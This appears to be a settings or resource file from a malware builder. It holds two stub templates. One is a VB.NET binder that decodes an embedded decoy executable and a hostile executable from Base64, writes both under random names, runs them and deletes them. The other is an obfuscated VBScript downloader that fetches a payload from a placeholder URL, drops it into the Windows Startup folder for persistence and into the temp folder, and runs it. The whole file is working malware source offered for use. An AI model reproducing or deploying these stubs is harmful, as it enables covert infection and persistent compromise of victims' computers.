data.name: JSDownloader
String1
data.value:
Imports System.Reflection Imports System.Windows.Forms Imports System.Diagnostics.Process Imports System.Environment Imports System.Convert Imports System Imports System.Diagnostics Imports system.threading Imports Microsoft.VisualBasic
<Assembly: AssemblyTitle("%ProductName%")> <Assembly: AssemblyDescription("%FileDescription%")> <Assembly: AssemblyCompany("%CompanyName%")> <Assembly: AssemblyProduct("%ProductName%")> <Assembly: AssemblyCopyright("%LegalCopyright%")> <Assembly: AssemblyTrademark("%LegalTrademarks%")> <Assembly: AssemblyFileVersion("%FileVersion%")> <Assembly: AssemblyVersion("%ProductVersion%")> Module Module1 Sub Main()
Dim %GoodFileCodedBytes% As String = %goodfile% Dim %BadFileCodedBytes% As String = %badfile% Dim %GoodFileBytes%() As Byte = Convert.FromBase64String(%GoodFileCodedBytes%) Dim %BadFileBytes%() As Byte = Convert.FromBase64String(%BadFileCodedBytes%) Dim %GoodFileName% as string = "\" & random_key(5) & ".exe" Dim %BadFileName% as string = "\" & random_key(5) & ".exe" IO.File.WriteAllBytes(Environment.CurrentDirectory & %GoodFileName%, %GoodFileBytes%) IO.File.WriteAllBytes(Environment.CurrentDirectory & %BadFileName%, %BadFileBytes%) Process.Start(Environment.CurrentDirectory & %GoodFileName%) Process.Start(Environment.CurrentDirectory & %BadFileName%) Do While IO.File.Exists(Environment.CurrentDirectory & %GoodFileName%) And IO.File.Exists(Environment.CurrentDirectory & %BadFileName%) Try IO.File.Delete(Environment.CurrentDirectory & %GoodFileName%) IO.File.Delete(Environment.CurrentDirectory & %BadFileName%) catch ex as exception end try Thread.Sleep(%SleeperValue%) Loop
End Sub Public Function random_key(ByVal lenght As Integer) As String Randomize() Dim s As New System.Text.StringBuilder("") Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray() For i As Integer = 1 To lenght Randomize() Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1 s.Append(b(z)) Next Return s.ToString End Function End Module

data.name: VBSDownlader
data.value:
Set YcytN = CreateObject("WScript.Shell") KFBb = wshShell.SpecialFolders("Startup") & "\name%..exe]" Call lXBfStR sub lXBfStR dim GFNItD: Set GFNItD = createobject("Microsoft.XMLHTTP") dim GSXDVB: Set GSXDVB = createobject("Adodb.Stream") GFNItD.Open "GET", "%url%", False GFNItD.Send with GSXDVB .type = 1 .open .write GFNItD.responseBody .savetofile KFBb, 2 end with end sub
BFBDF = wshShell.ExpandEnvironmentStrings("%Temp%") + "\%name%.exe" Call RYJNrbbrt sub RYJNrbbrt dim CXbCBX: Set CXbCBX = createobject("Microsoft.XMLHTTP") dim NGfmfmh: Set NGfmfmh = createobject("Adodb.Stream") CXbCBX.Open "GET", "%url%", False CXbCBX.Send with NGfmfmh .type = 1 .open .write CXbCBX.responseBody .savetofile BFBDF, 2 end with end sub YcytN.Exec (BFBDF)
